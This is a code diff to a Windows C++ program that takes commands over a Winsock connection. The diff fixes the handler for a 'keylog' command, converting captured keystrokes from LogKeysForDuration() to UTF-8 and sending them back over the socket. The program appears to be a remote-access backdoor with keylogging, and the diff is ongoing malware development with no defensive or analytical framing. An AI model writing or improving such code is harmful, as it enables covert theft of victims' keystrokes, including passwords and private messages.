@@ -3,9 +3,8 @@
 #include <ws2tcpip.h>
 #include <string>
 #include <windows.h>
-#include <string>
 #include <chrono>
-#include <iostream>
+#include <codecvt>
 
 
 #pragma comment(lib, "Ws2_32.lib")
@@ -125,7 +124,12 @@ int main() {
                 send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
             }
             else if (std::string(recvbuf, iResult) == "keylog") {
-                strcpy_s(sendbuf, LogKeysForDuration);
+                std::wstring wstr = LogKeysForDuration();
+                int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+                std::string strTo(sizeNeeded, 0);
+                WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], sizeNeeded, NULL, NULL);
+
+                strcpy_s(sendbuf, strTo.c_str());
                 send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
             }
         }
